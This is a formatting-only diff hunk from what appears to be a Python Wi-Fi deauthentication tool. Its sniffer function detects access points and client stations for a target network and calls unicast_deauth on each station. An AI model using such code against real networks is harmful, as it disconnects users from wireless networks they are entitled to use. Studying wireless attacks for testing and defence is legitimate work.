@@ -110,24 +110,30 @@ def sniffer_wrapper(wifi_interface, wifi_essid, bssids_aps_dict, bssids_stas_dic
                             if dot11_element.ID == 0:
                                 if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
                                     bssids_aps_dict.update({bssid_src: bssid_network})
-                                    print_info(f'AP detected for network {wifi_essid}'
+                                    print_info(
+                                        f'AP detected for network {wifi_essid}'
                                         f'\n    network      = {bssid_network}'
-                                        f'\n    access point = {bssid_src}')
+                                        f'\n    access point = {bssid_src}'
+                                    )
                                 break
                             dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                 
                 else: # wlan type ctl or wlan type data: from ap to sta, from sta to ap
                     if bssids_aps_dict.get(bssid_src) and (bssids_stas_dict.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
                         bssids_stas_dict.update({bssid_dst: bssid_src})
-                        print_info(f'STA detected for network {wifi_essid}'
+                        print_info(
+                            f'STA detected for network {wifi_essid}'
                             f'\n    station      = {bssid_dst}'
-                            f'\n    access point = {bssid_src}')
+                            f'\n    access point = {bssid_src}'
+                        )
                         unicast_deauth(wifi_interface, bssid_dst, bssid_src, bssid_network)
                     elif bssids_aps_dict.get(bssid_dst) and (bssids_stas_dict.get(bssid_src) != bssid_dst):
                         bssids_stas_dict.update({bssid_src: bssid_dst})
-                        print_info(f'STA detected for network {wifi_essid}'
+                        print_info(
+                            f'STA detected for network {wifi_essid}'
                             f'\n    station      = {bssid_src}'
-                            f'\n    access point = {bssid_dst}')
+                            f'\n    access point = {bssid_dst}'
+                        )
                         unicast_deauth(wifi_interface, bssid_src, bssid_dst, bssid_network)
         except Exception as e:
             raise MsgException(e, 'Sniffed frames could not be processed')
